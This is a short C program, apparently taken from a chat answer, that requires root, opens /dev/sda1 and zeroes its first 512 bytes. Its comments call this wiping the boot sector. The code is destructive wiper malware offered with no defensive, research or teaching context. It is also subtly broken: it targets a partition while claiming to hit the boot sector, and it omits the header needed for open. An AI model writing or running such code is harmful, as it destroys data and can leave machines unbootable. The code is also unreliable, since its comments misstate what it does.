#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    // Check if the program is being run as root
    if (getuid()!= 0) {
        printf("Error: This program must be run as root\n");
        return 1;
    }

    // Open the boot sector
    int fd = open("/dev/sda1", O_RDWR);
    if (fd < 0) {
        printf("Error: Unable to open /dev/sda1\n");
        return 1;
    }

    // Read the contents of the boot sector
    char buffer[512];
    read(fd, buffer, sizeof(buffer));

    // Overwrite the contents of the boot sector with an empty file
    memset(buffer, 0, sizeof(buffer));
    write(fd, buffer, sizeof(buffer));

    // Close the boot sector
    close(fd);

    // Print a message indicating that the boot sector has been modified
    printf("Boot sector modified\n");

    return 0;
}
```
